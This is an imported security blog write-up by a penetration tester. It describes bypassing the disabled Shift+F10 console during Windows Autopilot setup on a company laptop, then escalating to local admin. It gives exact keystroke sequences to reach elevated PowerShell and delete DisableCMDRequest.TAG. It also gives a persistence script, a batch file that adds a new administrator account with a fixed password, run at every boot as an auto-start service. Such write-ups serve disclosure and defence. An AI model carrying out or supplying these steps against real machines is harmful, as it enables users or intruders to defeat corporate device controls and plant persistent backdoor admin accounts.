---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-24_microsoft-windows-shift-f10-bypass-and-autopilot-privilge-escalation.md
original_filename: 2022-09-24_microsoft-windows-shift-f10-bypass-and-autopilot-privilge-escalation.md
title: Microsoft Windows Shift F10 Bypass and Autopilot privilge escalation
category: documents
detected_topics:
- access-control
- command-injection
- otp
- api-security
- mobile-security
tags:
- imported
- documents
- access-control
- command-injection
- otp
- api-security
- mobile-security
language: en
raw_sha256: 18154174187d2209a24953ee20184bc5b4f3711ecfd18e1bef53f1c337cf0030
text_sha256: 42e232e779b1779c5064263ea85f6b4dcb7ee5a177dc76723afb8405ca71781b
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: true
---

# Microsoft Windows Shift F10 Bypass and Autopilot privilge escalation

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-24_microsoft-windows-shift-f10-bypass-and-autopilot-privilge-escalation.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: True
- Raw SHA256: `18154174187d2209a24953ee20184bc5b4f3711ecfd18e1bef53f1c337cf0030`
- Text SHA256: `42e232e779b1779c5064263ea85f6b4dcb7ee5a177dc76723afb8405ca71781b`


## Content

---
title: "Microsoft Windows Shift F10 Bypass and Autopilot privilge escalation"
page_title: "Shift F10 bypass and Autopilot privilege escalation - Microsoft"
url: "https://k4m1ll0.com/ShiftF10Bypass-and-privesc.html"
final_url: "https://k4m1ll0.com/ShiftF10Bypass-and-privesc.html"
authors: ["Matek Kamilló (@k4m1ll0)"]
programs: ["Microsoft"]
bugs: ["Local Privilege Escalation"]
publication_date: "2022-09-24"
added_date: "2022-09-26"
source: "pentester.land/writeups.json"
original_index: 2123
---

[Back to the advisories](https://k4m1ll0.com/advisories)

# Microsoft Windows Shift F10 Bypass and Autopilot privilege escalation 

#ShiftF10Bypas #Windows11 #Autopilot #Microsoft #Hacking #CyberSecurity #NoCVE

Last Modified: 2024.01.19.

If you find it valuable, you can support me by making a donation. [Donate now](https://k4m1ll0.com/donations.html).

# The Story

During an official Penetration test, I examined a corporate environment. Obviously, I cannot reveal any information about the customer or the project. All information will be anonymized. 

Company X, like other companies, uses Microsoft solutions. In this case, Autopilot and the environment were the focus of the investigation. (Note: The Intune settings were unknown during the test. ) 

The goal was to gain access to company resources, elevate the level of privileges and break the company's security rules. 

This post demonstrates full chained exploitation, and it contains two steps. The second step is a known vulnerability, but there are other ways. 

I reported the vulnerability to Microsoft. There were several discussions between Microsoft and Company X. Unfortunately, I was not involved in these discussions, but it is not allowed me to share additional information. 

The result of the internal Microsoft examination is clear. It is not an Autopilot vulnerability, and they will not fix it. 

I agree with Microsoft it is not a vulnerability of Autopilot. **It is a vulnerability of Windows.** The Autopilot is just a case when it is possible to exploit it. (And it makes sense.) Probably there are other cases as well. 

I believe some companies use Autopilot with Microsoft-provided restrictions.They think it is safe to use it like this, but it is not. As a customer, my wish would be a secure install method. 

With the provided information, everyone can assess the real risks and take the necessary protective measures. 

**All operating systems from Windows XP up to Windows 11 are affected.** I had no chance to test the SHIFT F10 Bypass with Windows 7 or with Windows XP on a real machine. In every case there is a way to start an application from the Sticky Keys window or with other windows like the magnifier. I will use the Sticky Keys as an example. Based on the information available, all systems from XP onwards are likely to be affected. 

If somebody is interested only in the video of the bypass part, there is a youtube video at the end. 

##  Microsoft Installers 

During the testing the following OS images and versions were in use: 
  
  
  
  Windows 11 Enterprise Edition (Version 10.0.22000.675)
  SW_DVD9_WIN_Pro_11_21H2.7_64BIT_English_Pro_ENT_EDU_N_MLF_X23-14577.ISO
  d73f46de775882dd0a307c***REDACTED-SUSPECT-TOKEN***  349a667edcf6182d886c***REDACTED-SUSPECT-TOKEN***  c122cd
  Vulnerable Yes
  
  Windows 11 Enterprise Edition (Version 10.0.22000.739)
  SW_DVD9_WIN_Pro_11_21H2.8_64BIT_English_Pro_ENT_EDU_N_MLF_X23-16487.ISO
  e575058c730e92181374***REDACTED-SUSPECT-TOKEN***  43b586e98a940f410bd3***REDACTED-SUSPECT-TOKEN***  8bc2e0df
  Vulnerable Yes
  
  Windows 10 PRO Edition (Version 10.0.19044.1288)
  Win10_21H2_English_x64.iso
  55d267a8bf03791dd3db4b***REDACTED-SUSPECT-TOKEN***  4c7d2c674e332c1d4dd64b***REDACTED-SUSPECT-TOKEN***  a1c8
  Vulnerable Yes
  
  

##  An imaginary real-life Autopilot case 

Imagine that there is a big company that has many users. They want to reduce IT costs, so it is not IT that installs and configures the new employees' computers, but the employee does this at home in an automated way. It is the case when Microsoft Autopilot comes into the picture. 

![01](./shiftf10bypass/01.png)

IT staff prepares the corporate laptop for Bob with a standard Windows Image. IT staff configures the INTUNE services and the corresponding profiles. IT staff restricts the setup options of the installer. (This is a key thing.) IT staff disable boot options and configure BIOS and UEFI passwords. 

![02](./shiftf10bypass/02.png)

Bob is a new employe and receives a laptop from the IT. Bob gets a new company username and password that he can use to log in. 

![03](./shiftf10bypass/03.png)

Bob goes home and logs in. The installation and configuration will start. During the process, the system will restart several times. In the end, Bob's new company laptop complies with company rules and has access to company resources. 

##  What are these installer restrictions exactly? 

With the Shift and F10 key combination, an admin command window will pop up during a simple Windows installation. In modern systems like Windows 11, the Control Panel is also accessible. 

When users are involved partly in the Installation or Setup process, it comes in handy to disable this feature. Of course, Microsoft provides a way to disable this feature. In the test environment, these settings were in use. 

The IT staff naturally thinks there is no problem. Of course, other boot options are disabled. Users can only change minimal settings during the process, such as the keyboard layout or Wi-Fi settings. In the end, the company laptop complies with company rules and has access to company resources. 

##  During the Penetration test, I was Bob with a physical laptop. 

![04](./shiftf10bypass/04.png)

I bypassed and turned off the restrictions with UI tricks. After that, I could change the settings as I want. (Installing programs, creating users and groups, modifying system settings, modifying the registry settings. Yes, it is possible obtaining and keep NT Authority privileges.) 

##  Shift F10 Bypass 

By pressing the ALT-TAB keys, the window switcher will be visible for a few seconds. There is only one visible window, the installer window. It is hard to read the content, but the magnifier tool can help. 

![05](./shiftf10bypass/05.png)

The accessibility and other features are enabled. There are features with modal windows that are available. In some cases, there are links on these windows. The sticky keys feature is a good example. (Press five times the shift key, and it will pop up.) 

![06](./shiftf10bypass/06.png)

The link on that launches the Control Panel in the background. It is visible in the window switcher with ALT-TAB keys. 

![07](./shiftf10bypass/07.png)

It is impossible to bring the window to the front, but it is possible to select it. 

![71](./shiftf10bypass/71.png)

The Sticky keys window is necessary once more. This time, the window must remain open. Everything will be in the background, and the relevant parts will be visible only in the Application switcher. **It is possible to type commands blindly, and the system will execute these commands.**

The well-known windows and r keys start the run command window if the appropriate window is selected. With the powershell command, a new powershell window will start. 

![09](./shiftf10bypass/09.png)

### **So, I can execute commands. Let's remove the protection.**

There is a file the "c:\windows\Setup\scripts\DisableCMDRequest.TAG" file. If this file exists, the windows instance will apply the restrictions. The restrictions will disappear after a simple reset if there is no such file. A shell and a proper user are necessary to delete the TAG file. 

Summary of the steps: 
  
  
  
  If the focuse is not correct, use ALT + TAB until it is in the good place.
  
  1. open sticky keys - press shift 5 times.
  2. Select the Sticky Keys Window and press Windows + r [enter] (ALT+TAB)
  3. powershell [enter] (ALT+TAB)
  4. Start-Process powershell -verb runAs [enter] (UAC OK)
  5. cd windows\setup\scripts [enter]
  6. del DisableCMDRequest.TAG (y)
  7. shutdown -r -t 0 -f [enter]
  
  

Openning powershell

![09](./shiftf10bypass/09.png)

Openning elevated powershell 

![91](./shiftf10bypass/91.png) ![10](./shiftf10bypass/10.png) ![11](./shiftf10bypass/11.png)

Deleting the TAG file 

![12](./shiftf10bypass/12.png) ![13](./shiftf10bypass/13.png)

Restarting the machine. Enjoying the new unrestricted environment: 

![14](./shiftf10bypass/14.png)

##  Video proof 

##  Multiple continuations 

There are multiple ways to continue from here. Some solutions work temporarily or in a limited time frame. I used to old Narrator.exe trick and it worked as well. A lot of experiments can be done offline, it is possible to automate the attack and use a simple USB device. 

##  Local Admin privilege escalation and the service trick

The steps so far have been completed before the Autopilot process. Several things happen during the Autopilot process, including system updates, system reboots, and various settings are changed. There is an Autopilot step that removes the local admin accounts. In some cases, it does not work. It is a known vulnerability, and there is also a fix. I thought my installer contains this fix, but I got the wrong information. 

![04](./shiftf10bypass/04.png)

In my case, the newly created admin users remained on the system. Unfortunately, it was not possible to log in with these users. Password change was necessary and local login was blocked by the company policy for these users. 

The easiest way to move forward was to use a windows auto service. After each boot, the new service creates a new local admin user with a predefined password. 
  
  
  
  # Shift + F10
  powershell
  
  # Open PowerShell window without Restrictions
  Start-Process powershell -verb runAs
  
  # Open cmd window without Restrictions
  cmd.exe
  
  # Creating folder
  mkdir c:\1337
  cd 1337
  
  # Creating k44.bat file for the service with notepad:
  notepad k44.bat
  @echo OFF
  set K44_USER=k44_%RANDOM%
  net user %K44_USER% aA123456 /add
  net localgroup Administrators %K44_USER% /add
  
  # Save the file
  
  # Creating the service
  sc create k44service binPath= "c:\1337\k44.bat" DisplayName= "k44service" start=auto
  
  # Testing the service, it will fail, but it will create the user
  sc start k44service
  
  

![15](./shiftf10bypass/15.png)

After the preparing step, the normal process should be followed. After several reboots and logins, there will be a final stage when everything is ready. The company policies applied.

With the newly created user it is possible to execute commands as administrator. 

  1. The system is UpToDate (fully patched.) 
  2. The local admin users are working perfectly. 
  3. The user has access to the Company resources. :) 

![16](./shiftf10bypass/16.png)

I installed one of my favorite old games and played a little bit. With it, I proved it is possible to install custom software on the company laptop. 

![100](./shiftf10bypass/100.png)

The end.

© 2019-2025 Kamilló Matek (k4m1ll0) All Rights Reserved
